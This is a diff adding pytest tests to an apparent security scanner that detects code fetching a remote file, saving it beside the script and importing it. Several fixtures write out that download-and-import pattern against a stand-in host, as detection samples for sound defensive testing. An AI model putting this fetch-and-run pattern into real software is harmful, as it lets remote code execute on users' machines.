@@ -1090,6 +1090,79 @@ def test_o3b_qualified_urlopen_staged_import_is_fail():
     assert _staged_import_verdict(src) == "FAIL"
 
 
+def test_b979_o3_subdirectory_bare_urlopen_staged_import_is_fail():
+    """B-979: the identical O3 source as test_o3_ticket_verbatim_bare_urlopen_
+    staged_import_is_fail above, but the scanned file itself lives in a subdirectory
+    (scripts/x.py) rather than at the artifact root. Before the fix, the same-file
+    `search_dirs` base for this correlation was unconditionally
+    `Loc("FILE", ())` -- the artifact ROOT -- instead of the file's own containing
+    directory (`Loc("FILE", facts.relparts[:-1])`, the same pattern
+    `_b917_import_sites` already used for relative imports). The write's own Loc IS
+    the file's own directory (`os.path.dirname(__file__)` + "v.py"), so for a
+    subdirectory file the candidate built from the wrong base (artifact root) never
+    matched it and this finding was silently missed."""
+    src = dedent('''
+        import os
+        from urllib.request import urlopen
+        p = os.path.join(os.path.dirname(__file__), "v.py")
+        open(p, "wb").write(urlopen("https://example.invalid/p").read())
+        import v
+    ''')
+    findings = _analyze(src, "scripts/x.py")
+    hits = [f for f in findings if f.rule in ("REMOTE_STAGED_IMPORT", "STAGED_IMPORT_UNRESOLVED")]
+    assert any(f.rule == "REMOTE_STAGED_IMPORT" for f in hits), findings
+
+
+def test_b979_o3_differential_top_level_vs_subdirectory_both_convict():
+    """O3 differential, pinned explicitly: the SAME source must convict whether the
+    file sits at the artifact root or in a (possibly nested) subdirectory -- the
+    file's own location must never change the verdict for a same-file write/import
+    correlation."""
+    src = dedent('''
+        import os
+        from urllib.request import urlopen
+        p = os.path.join(os.path.dirname(__file__), "v.py")
+        open(p, "wb").write(urlopen("https://example.invalid/p").read())
+        import v
+    ''')
+    for filename in ("skill.py", "scripts/x.py", "a/b/c/deep.py"):
+        findings = _analyze(src, filename)
+        assert any(f.rule == "REMOTE_STAGED_IMPORT" for f in findings), (filename, findings)
+
+
+def test_b979_subdirectory_unrelated_tmp_write_and_import_is_no_finding():
+    """Control for the fix above: a subdirectory file with a REAL remote write and a
+    REAL absolute import, but to unrelated locations (a /tmp cache write, an
+    unrelated top-level `helpers` import) must stay clean exactly like its
+    top-level counterpart (test_r1a_own_import_plus_unrelated_tmp_cache_is_no_finding
+    below) -- the corrected, narrower same-file base must not spuriously convict an
+    unrelated write/import pair just because both now resolve under the file's own
+    subdirectory."""
+    src = _src('''
+        import os
+        open(os.path.join("/tmp/examples", "helpers.py"), "wb").write(data)
+        from helpers import do_thing
+    ''')
+    findings = _analyze(src, "scripts/x.py")
+    hits = [f for f in findings if f.rule in ("REMOTE_STAGED_IMPORT", "STAGED_IMPORT_UNRESOLVED")]
+    assert not hits, findings
+
+
+def test_b979_subdirectory_legitimate_script_with_no_staged_write_is_no_finding():
+    """The clean-fixture shape B-979 asks for verbatim: a legitimate subdirectory
+    script (scripts/helper.py) that imports a genuine sibling module and does NOT do
+    the staged-write-then-import pattern at all -- must stay clean."""
+    src = dedent('''
+        from . import utils
+
+        def run():
+            return utils.do_thing()
+    ''')
+    findings = _analyze(src, "scripts/helper.py")
+    hits = [f for f in findings if f.rule in ("REMOTE_STAGED_IMPORT", "STAGED_IMPORT_UNRESOLVED")]
+    assert not hits, findings
+
+
 def test_r1a_own_import_plus_unrelated_tmp_cache_is_no_finding():
     src = _src('''
         import os
